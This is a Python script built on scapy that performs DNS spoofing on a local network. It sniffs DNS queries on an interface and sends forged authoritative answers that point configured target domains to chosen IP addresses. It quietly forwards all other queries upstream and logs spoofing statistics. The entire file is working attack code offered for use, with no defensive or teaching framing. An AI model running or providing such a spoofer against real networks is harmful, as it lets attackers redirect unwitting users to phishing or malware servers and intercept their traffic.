import scapy.all as scapy
import socket
import threading
import json
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest = "interface", help = "Interface")
    parser.add_argument("-c", "--config", dest = "config", help = "Config file")
    options = parser.parse_args()
    if not options.interface:
        parser.error("Please specify an IP Address for the target")
    elif not options.config:
        parser.error("Please specify an IP Address for the gateway")
    return options

def load_config(config_file):
    try:
        with open(config_file, 'r') as f:
            config = json.load(f)
        
        targets = config.get('targets', {})
        forward_non_target = config.get('forward_non_target', True)
        upstream = config.get('upstream', '10.10.0.1')
        return targets, forward_non_target, upstream

    except FileNotFoundError:
        print(f"File not found")
    except json.JSONDecodeError as e:
        print(f"Invalid json format: {e}")

def start_udp53_sink(bind_ip="0.0.0.0", port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except Exception:
        pass
    sock.bind((bind_ip, port))
    _stop = threading.Event()

    def _loop():
        while not _stop.is_set():
            try:
                sock.settimeout(1.0)
                _ = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    def stop():
        _stop.set()
        try:
            sock.close()
        except Exception:
            pass
        t.join(timeout=2)

    return stop

def spoof_response(packet, spoof_ip):
    q_name = packet[scapy.DNSQR].qname
    q_type = packet[scapy.DNSQR].qtype
    q_id = packet[scapy.DNS].id

    response = scapy.IP(
        dst=packet[scapy.IP].src,
        src=packet[scapy.IP].dst
    ) / scapy.UDP(
        dport=packet[scapy.UDP].sport,
        sport=packet[scapy.UDP].dport
    ) / scapy.DNS(
        id=q_id,
        qr=1,
        aa=1,
        qd=packet[scapy.DNS].qd,
        an=scapy.DNSRR(
            rrname=q_name,
            type=q_type,
            rdata=spoof_ip,
            ttl=300
        )
    )
    return response

def dns_handler(packet):
    if scapy.DNS in packet and packet[scapy.DNS].qr == 0 and scapy.DNSQR in packet:
        statistics["intercepted_queries"] += 1

        try:
            q_name = packet[scapy.DNSQR].qname.decode().rstrip('.')
            src_ip = packet[scapy.IP].src

            spoof = False
            for target, spoofed_ip in targets.items():
                if q_name.endswith(target):
                    spoofed_response = spoof_response(packet, spoofed_ip)
                    scapy.send(spoofed_response, verbose=False, iface=interface)

                    statistics["spoofed_queries"] += 1

                    print(f"[SPOOFED] {q_name} -> {spoofed_ip} (client: {src_ip})")
                    spoof = True
                    break
            
            if not spoof and forward_non_target:
                threading.Thread(target=forward_query, args=(packet,), daemon=True).start()
        
        except Exception as e:
            pass

def forward_query(packet):
    try:
        q_name = packet[scapy.DNSQR].qname.decode().rstrip('.')
        orig_id = packet[scapy.DNS].id
        orig_sport = packet[scapy.UDP].sport
        upstream_query = scapy.IP(dst=upstream) / scapy.UDP(sport=scapy.RandShort(), dport=53) / scapy.DNS(id=orig_id, qd=packet[scapy.DNS].qd)
        response = scapy.sr1(upstream_query, timeout=5, verbose=False)
        
        if response and scapy.DNS in response:
            forwarded_response = scapy.IP(
                dst=packet[scapy.IP].src,
                src=packet[scapy.IP].dst
            ) / scapy.UDP(
                dport=packet[scapy.UDP].sport,
                sport=packet[scapy.UDP].dport
            ) / scapy.DNS(
                id=packet[scapy.DNS].id,
                qr=response[scapy.DNS].qr,
                aa=response[scapy.DNS].aa,
                tc=response[scapy.DNS].tc,
                ra=response[scapy.DNS].ra,
                rcode=response[scapy.DNS].rcode,
                qd=response[scapy.DNS].qd,
                an=response[scapy.DNS].an,
                ns=response[scapy.DNS].ns,
                ar=response[scapy.DNS].ar
            )
            
            scapy.send(forwarded_response, iface=interface, verbose=False)
            statistics['forwarded_queries'] += 1
            print(f"Query forwarded: {q_name}")
    except Exception:
        pass

def final_statistics():
    statistic_file = f"dns_spoof_stats.json"

    statistics_data = {
        'statistics': statistics,
        'targets': targets,
        'forward_non_target': forward_non_target
    }

    try:
        with open(statistic_file, 'w') as f:
            json.dump(statistics_data, f)
    except Exception as e:
        print("Error during json dump, {e}")

def main():
    print(targets)
    stop_sink = start_udp53_sink()

    try:
        print("Started sniffing")
        scapy.sniff(iface=interface, filter="udp port 53", prn=dns_handler, store=False)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error in dns spoofing, {e}")
    finally:
        final_statistics()

options = get_args()

interface = options.interface
config_input = options.config
targets, forward_non_target, upstream = load_config(config_input)
statistics = {
    'intercepted_queries': 0,
    'spoofed_queries': 0,
    'forwarded_queries': 0,
    'spoofed_domains': []
}

main()